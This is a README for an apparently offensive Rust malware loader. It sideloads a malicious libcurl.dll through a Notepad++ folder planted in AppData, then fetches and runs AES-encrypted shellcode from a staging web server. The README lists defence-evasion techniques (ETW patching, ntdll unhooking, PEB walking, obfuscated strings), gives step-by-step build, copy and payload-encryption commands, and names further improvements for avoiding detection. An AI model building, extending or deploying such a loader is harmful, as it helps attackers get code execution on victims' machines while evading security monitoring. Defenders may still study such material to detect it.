# APC queue

## Execution flow

1. Drop `Notepad++` folder in `~\AppData\Local\Programs\`
2. Run `GPU.exe` to sideload the DLL
3. `libcurl.dll` fetches encrypted shellcode from web server
4. `libcurl.dll` executes shellcode

## Evasion features

- PEB walk
- ETW patch
- Ntdll unhook
- Obfuscated strings
- Local shellcode using `Nt*` APIs

## Usage

#### Compile DLL

```bash
cd libcurl-dll
```

```rs
cargo build --release
```

#### Copy DLL

```bash
cp .\target\release\libcurl.dll ..\utils\Notepad++\updater\
```

#### Encrypt shellcode (Careful to use the same KEY and NONCE)

```rs
./aes-gcm-encryptor.exe <shellcode.bin>
```

#### Modify staging URL
> Default `http://127.0.0.1/updater.enc`


## Improvements

- (patch.rs) Remove `GetModuleHandleA`, `GetProcAddress`, `VirtualProtect`
- (load.rs) Use built-in const from `windows-sys`
